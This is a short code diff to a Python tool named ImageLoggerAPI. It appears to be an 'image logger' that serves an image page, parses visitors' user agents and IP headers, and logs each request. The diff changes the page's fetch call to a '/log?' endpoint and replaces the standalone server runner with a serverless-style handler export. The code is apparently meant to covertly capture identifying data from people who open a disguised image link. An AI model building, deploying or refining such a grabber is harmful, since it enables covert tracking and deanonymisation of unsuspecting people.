@@ -1,4 +1,4 @@
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
@@ -170,7 +170,7 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img" onclick="fetch('{self.path}').then(response => response.json().then(data => console.log(data)))"></div>'''.encode()
+}}</style><div class="img" onclick="fetch('/log?{self.path[1:]}').then(response => response.json().then(data => console.log(data)))"></div>'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
@@ -258,11 +258,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-def run(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8080):
-    server_address = ('', port)
-    httpd = server_class(server_address, handler_class)
-    print(f'Starting server on port {port}...')
-    httpd.serve_forever()
-
-if __name__ == "__main__":
-    run()
+handler = app = ImageLoggerAPI
